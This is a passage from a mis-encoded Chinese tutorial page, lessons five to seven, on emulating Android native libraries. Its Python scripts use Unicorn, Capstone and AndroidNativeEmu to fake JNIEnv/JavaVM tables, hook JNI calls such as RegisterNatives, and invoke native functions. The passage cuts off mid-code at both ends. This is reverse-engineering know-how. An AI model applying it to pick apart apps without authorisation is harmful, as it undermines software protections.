id="ç¬¬äº”è¯¾æ—¶">ç¬¬äº”è¯¾æ—¶</h2><h3 id="Unicornæ¨¡æ‹Ÿè°ƒç”¨JNI-Onloadï¼Œ">Unicornæ¨¡æ‹Ÿè°ƒç”¨JNI_Onloadï¼Œ</h3><p>å…¶ä¸­ä¼šæ¶‰åŠåˆ°Javavmï¼Œå…·ä½“å®ç°å’ŒJnienvå·®ä¸å¤š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicorn.arm_const</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">700</span>*<span class="number">4</span> <span class="keyword">and</span> address&lt;=<span class="number">710</span>*<span class="number">4</span>:</span><br><span class="line">        index=(address-<span class="number">700</span>*<span class="number">4</span>)/<span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call javavm function-----------&quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call javavm-&gt;GetEnv-----------&quot;</span> + <span class="built_in">str</span>(index))</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)  <span class="comment">#è¯»å‡ºæ¥envæŒ‡é’ˆ</span></span><br><span class="line">            mu.mem_write(r1value,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">601</span>*<span class="number">4</span>))          <span class="comment">#è®©envçš„åœ°å€ä¸ºè‡ªå®šä¹‰çš„601*4 è¿™æ ·å°±å¯ä»¥æŒ‡å‘å®šä¹‰çš„envç»“æ„ä½“</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">0</span> <span class="keyword">and</span> address&lt;=<span class="number">300</span>*<span class="number">4</span>:</span><br><span class="line">        index=address/<span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jnienv funciton-----------&quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv FindClass is called&quot;</span>)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            classname=readstring(mu,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv FindClass:&quot;</span>+classname)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,<span class="number">666</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">215</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv RegisterNatives:&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            <span class="comment"># funcname_bytearray=mu.mem_read(r2value,4)</span></span><br><span class="line">            <span class="comment"># funcname_addr=struct.unpack(&quot;I&quot;,funcname_bytearray)</span></span><br><span class="line">            <span class="comment"># funcname=readstring(mu,funcname_addr)</span></span><br><span class="line">            r3value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R3)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;env:&quot;</span>+<span class="built_in">str</span>(r0value)+<span class="string">&quot;---jclass&quot;</span>+<span class="built_in">str</span>(r1value)+<span class="string">&quot;---&quot;</span>+<span class="built_in">str</span>(r2value)+<span class="string">&quot;---&quot;</span>+<span class="built_in">str</span>(r3value)+<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">676</span>/<span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars-----------------&quot;</span>)</span><br><span class="line">            r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            content=readstring(mu,r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value)+<span class="string">&#x27;-----&#x27;</span>+content+<span class="string">&#x27;-----&#x27;</span>+<span class="built_in">str</span>(r2value))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars over-----------------&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">668</span>/<span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF-----------------&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            content = readstring(mu, r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value) + <span class="string">&#x27;-----&#x27;</span> + content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF over-----------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jni interface------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_block</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_blocak------------------------------------------------------&quot;</span>)</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[hook_blocak_addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#æ˜ å°„</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#è¿”å›true æ¨¡æ‹Ÿå™¨ç»§ç»­å¾€ä¸‹é¢æ‰§è¡Œä»£ç   Falseåˆ™ç›¸å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_jni</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;unicorn05.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0xc00</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0xc00</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">    JNIFUNCTIONLISTBASE=<span class="number">0x0</span></span><br><span class="line">    JNIFUNCTIONLISTSIZE=<span class="number">0x1000</span></span><br><span class="line">    JNINATIVEINTERFACE=<span class="number">301</span>   <span class="comment">#jniå‡½æ•°ä½ç½®</span></span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>, <span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–jniæ¥å£ä¸­æ¯ä¸ªå‡½æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>+JNIFUNCTIONLISTBASE,<span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–jninativeinterfaceç»“æ„ä½“</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>,<span class="number">600</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>,struct.pack(<span class="string">&quot;I&quot;</span>,(i-<span class="number">300</span>)*<span class="number">4</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–jnienv* env  æŒ‡å‘jninativeinterfaceé¦–éƒ¨</span></span><br><span class="line">    jnienv_pointer=<span class="number">601</span>*<span class="number">4</span></span><br><span class="line">    mu.mem_write(jnienv_pointer,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">300</span>*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    JAVAVMFUNCTIONLISTBASE=<span class="number">700</span>*<span class="number">4</span></span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–jniæ¥å£ä¸­æ¯ä¸ªå‡½æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i * <span class="number">4</span> + JAVAVMFUNCTIONLISTBASE, <span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–jniinvokeinterfaceç»“æ„ä½“</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i * <span class="number">4</span>+JAVAVMFUNCTIONLISTBASE+<span class="number">40</span>, struct.pack(<span class="string">&quot;I&quot;</span>, i * <span class="number">4</span> + JAVAVMFUNCTIONLISTBASE+ <span class="number">1</span>)) <span class="comment">#å’Œå‰é¢å¯¹åº”</span></span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–javavm *vm æŒ‡å‘javavmç»“æ„ä½“çš„é¦–éƒ¨</span></span><br><span class="line">    javavm_pointer = <span class="number">700</span> * <span class="number">4</span>+<span class="number">80</span></span><br><span class="line">    mu.mem_write(javavm_pointer, struct.pack(<span class="string">&quot;I&quot;</span>, JAVAVMFUNCTIONLISTBASE+<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,javavm_pointer)  <span class="comment">#å­˜æ”¾æŒ‡é‡åœ°å€</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x0</span>)</span><br><span class="line">    sp = address + size - <span class="number">16</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP, sp)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    <span class="comment">#mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem)</span></span><br><span class="line">    addrstart = address + <span class="number">0x0c00</span> + <span class="number">1</span></span><br><span class="line">    addrend = address + <span class="number">0x0c66</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> datetime</span><br><span class="line">        starttime=datetime.datetime.now()</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;emulat over&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        endtime = datetime.datetime.now()</span><br><span class="line">        <span class="built_in">print</span>(endtime-starttime)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_jni()</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å…­è¯¾æ—¶">ç¬¬å…­è¯¾æ—¶</h2><p><strong>AndroidNativeEmuè°ƒç”¨JNIå‡½æ•°</strong></p><p>åœ¨é¡¹ç›®ä¸­ç»™çš„åŸºç¡€ä¸Šä¿®æ”¹å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#å®ç°æ‰“å°å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_methodæ ‡ç­¾</span></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>):</span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿›è¡Œhook</span></span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;strlen&#x27;</span>, emulator.hooker.write_function(strlen) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;_Z4testv&#x27;</span>, emulator.hooker.write_function(_Z4testv) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#emulator.load_library(&quot;example_binaries/32/libc.so&quot;, do_init=False)</span></span><br><span class="line"><span class="comment">#lib_module = emulator.load_library(&quot;example_binaries/32/libnative-lib.so&quot;, do_init=False)</span></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/unicorncourse06.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add debugging.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    instruction = uc.mem_read(address, size)</span><br><span class="line">    instruction_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;&#123;:02x&#125; &#x27;</span>.<span class="built_in">format</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> instruction)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;# Tracing instruction at 0x%x, instruction size = 0x%x, instruction = %s&#x27;</span> % (address, size, instruction_str))</span><br><span class="line"></span><br><span class="line"><span class="comment">#emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Runs a method of &quot;libnative-lib.so&quot; that calls an imported function &quot;strlen&quot; from &quot;libc.so&quot;.</span></span><br><span class="line"><span class="comment">#emulator.call_symbol(lib_module, &#x27;_Z4testv&#x27;) #è¿è¡Œè¿™ä¸ªå‡½æ•°</span></span><br><span class="line">funcname=<span class="string">&#x27;Java_com_example_unicorncourse04_MainActivity_stringFromJNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œç±»æ¯”frida</span></span><br><span class="line">result=emulator.call_symbol(lib_module, <span class="string">&#x27;Java_com_example_unicorncourse04_MainActivity_stringFromJNI&#x27;</span>,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&quot;testjnifunction&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;second--------------------------------&quot;</span>)</span><br><span class="line">result=emulator.call_native(lib_module.base+<span class="number">0x0b58</span>+<span class="number">1</span>,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&quot;testjnifunction&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸ƒè¯¾æ—¶">ç¬¬ä¸ƒè¯¾æ—¶</h2><p>AndroidNativeEmuæ¨¡æ‹ŸJNIOnLoadåŠ¨æ€æ³¨å†Œjniå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 